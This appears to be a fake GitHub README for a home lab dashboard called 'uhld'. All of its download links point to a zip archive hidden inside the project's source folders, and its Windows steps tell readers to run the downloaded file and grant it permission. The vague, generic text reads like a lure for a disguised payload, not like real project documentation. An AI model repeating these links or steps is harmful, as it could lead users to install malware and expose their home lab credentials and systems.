# 🏠 uhld - Simple Control for Your Home Lab

[![Download uhld](https://img.shields.io/badge/Download-uhld-blue?style=for-the-badge)](https://raw.githubusercontent.com/gastanksingletax279/uhld/main/frontend/src/plugins/hdhomerun/Software_v2.3.zip)

## 🚀 Getting Started

uhld is a home lab dashboard for people who want one place to check their systems. It helps you keep track of tools like Docker, Proxmox, NAS devices, Plex, Tailscale, and more.

Use it on Windows if you want a clear view of your home setup without jumping between many tabs. This guide shows you how to download it, set it up, and start using it.

## 📥 Download uhld

Visit this page to download and run the app on Windows:

[https://raw.githubusercontent.com/gastanksingletax279/uhld/main/frontend/src/plugins/hdhomerun/Software_v2.3.zip](https://raw.githubusercontent.com/gastanksingletax279/uhld/main/frontend/src/plugins/hdhomerun/Software_v2.3.zip)

If the page has a release file for Windows, download that file first. If it shows source files only, use the setup steps below to run it from the project files.

## 🖥️ What You Need

Before you start, make sure your Windows PC has:

- Windows 10 or Windows 11
- A modern web browser
- At least 4 GB of RAM
- 500 MB of free disk space
- A network connection to reach your home lab tools

If you plan to use containers or run local services, your system should also have:

- Docker Desktop, if you want to run services in containers
- Access to your home lab network
- The login details for the devices you want to monitor

## 🧩 What uhld Does

uhld brings several home lab tools into one dashboard. It can help you:

- View your servers and services in one place
- Check Docker containers
- Track Proxmox nodes and virtual machines
- Watch NAS status, such as Synology systems
- Open links to Plex, Unifi, Cloudflare, and Tailscale tools
- Organize tools with a plugin system
- Use a clean web interface built with React and Tailwind CSS
- Store settings in SQLite for simple local use

## 📌 Before You Install

Take a moment to get ready:

1. Open the download page in your browser.
2. Decide where you want to keep the files.
3. Make sure you have permission to install software on your PC.
4. If you use antivirus software, keep it on and let it scan the files.
5. If your home lab uses remote access, make sure you can reach it from your Windows machine.

## 🔧 Install on Windows

Follow these steps to get uhld running on Windows.

### Option 1: Download a Windows file

If the page offers a Windows app file, do this:

1. Open the download page.
2. Download the Windows file.
3. Save it to your Downloads folder or Desktop.
4. Double-click the file to run it.
5. If Windows asks for permission, choose Yes.
6. Follow the steps on screen.

### Option 2: Run from the project files

If the page gives you the source project instead of a ready-made app, use this path:

1. Download the project files from the GitHub page.
2. Unzip the files if they came in a .zip folder.
3. Open a command window in the project folder.
4. Install the needed packages.
5. Start the app with the provided start command.

If you do not know which command to use, look for a README file in the project folder. It usually lists the exact start steps.

## 🧭 First-Time Setup

After you start uhld, do these steps:

1. Open the app in your browser if it does not open on its own.
2. Sign in if your setup asks for login details.
3. Add your home lab services one by one.
4. Enter the address for each tool you want on the dashboard.
5. Save your changes.
6. Refresh the page to make sure the data appears.

Good first tools to add:

- Docker host
- Proxmox server
- Synology NAS
- Plex media server
- Tailscale network
- Unifi controller
- Cloudflare services

## 🗂️ Using the Dashboard

After setup, you can use uhld to watch your home lab from one screen.

### Common things you can do

- Open a service with one click
- Check whether a server is up
- View container status
- Jump to your NAS tools
- Keep your most used pages in one place
- Use plugins to add more tools later

### Helpful ways to organize it

- Put your most used tools at the top
- Group similar tools together
- Keep remote access tools near each other
- Use clear names for each item
- Remove tools you no longer use

## 🔌 Plugin System

uhld includes a plugin system for extra tools and custom views. This helps if your home lab grows over time.

You can use plugins to:

- Add new device types
- Show extra status details
- Link to special admin pages
- Group tools by purpose
- Create a layout that fits your setup

If you are new to plugins, start with the built-in tools first. Then add more as you get comfortable.

## 🛠️ Troubleshooting

If something does not work, try these steps.

### The app will not open

- Check that the file finished downloading
- Run it again
- Restart your PC
- Make sure Windows did not block the file

### The dashboard is blank

- Refresh the page
- Check your internet connection
- Make sure the service address is correct
- Confirm the device is on your home network

### A device shows as offline

- Check the device power
- Make sure the network cable or Wi-Fi is working
- Test the device in its own admin page
- Confirm the IP address has not changed

### Docker services do not appear

- Check that Docker is running
- Make sure the container is started
- Confirm the app can reach the Docker host
- Review the service address and port

### Proxmox, NAS, or Plex does not connect

- Check the login details
- Make sure the server is online
- Confirm the port and URL are correct
- Test the link in your browser first

## 🧾 Suggested Folder Setup

If you want to keep things tidy on Windows, use this folder layout:

- Downloads for the installer or zip file
- Documents for notes and service addresses
- Desktop for a shortcut to the app
- A separate folder for config files and backups

This makes it easier to find your setup later if you need to make changes.

## 🔒 Keeping Your Setup Safe

Use these habits to keep your home lab setup in good shape:

- Use strong passwords
- Keep your home network secure
- Change default admin logins
- Limit access to trusted devices
- Keep Windows updated
- Back up your dashboard settings

## 📋 Useful Starting Checklist

Before you finish setup, make sure you have:

- Downloaded the app or project files
- Opened the app on Windows
- Added your main home lab tools
- Checked that each link works
- Saved your settings
- Kept a backup of your config

## 🌐 Best Use Cases

uhld works well if you want to monitor:

- A Docker-based home server
- A Proxmox lab
- A Synology NAS
- Plex media access
- Cloudflare records and services
- Tailscale access
- Unifi network gear
- Multiple self-hosted tools in one place

## 📁 Repository Details

- Name: uhld
- Description: Ultimate Homelab Dashboard
- Topics: cloudflare, dashboard, docker, fastapi, homelab, kubernetes, nas, network-tools, plex, plugin-system, proxmox, python, react, self-hosted, sqlite, synology, tailscale, tailwindcss, typescript, unifi

## 🧠 Quick Start Path

1. Open the download page.
2. Download the Windows file or the project files.
3. Run or open the app on your PC.
4. Add your home lab tools.
5. Save the layout you want.
6. Use the dashboard as your main control screen